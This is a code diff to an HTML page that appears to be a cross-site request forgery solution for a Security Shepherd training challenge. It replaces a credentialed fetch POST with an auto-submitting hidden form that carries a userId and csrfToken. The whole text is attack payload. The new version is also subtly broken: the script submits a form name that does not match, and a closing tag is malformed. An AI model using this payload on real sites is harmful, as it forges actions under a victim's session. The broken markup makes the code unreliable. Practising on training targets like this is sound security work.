@@ -1,17 +1,14 @@
 <html>
     <body>
-        <iframe sandbox="allow-scripts allow-forms allow-same-origin" src="https://security-shepherd.dev.inf.elasticnet.co/challenges/7d79ea2b2a82543d480a63e55ebb8fef3209c5d648b54d1276813cd072815df3.jsp" >
-        </iframe>
+
+        <form name="ff" action="https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/plusplus" method="POST">
+            <input type="hidden" name="userId" value="d35874530d87a07ad3cd5864affdf5736743f5ad" />
+            <input type="hidden" name="csrfToken" value="64209867419946110764791174083646112488" />
+            <input type="submit"/>
+        </form
+
         <script>
-            fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/plusplus', {
-                method: 'POST',
-                credentials: "include",
-                mode: "no-cors",
-                body: JSON.stringify({
-                    "userId": "d35874530d87a07ad3cd5864affdf5736743f5ad",
-                    "csrfToken": "64209867419946110764791174083646112488",
-                })
-            });
+            document.csrfForm.submit();
         </script>
     </body>
 </html>
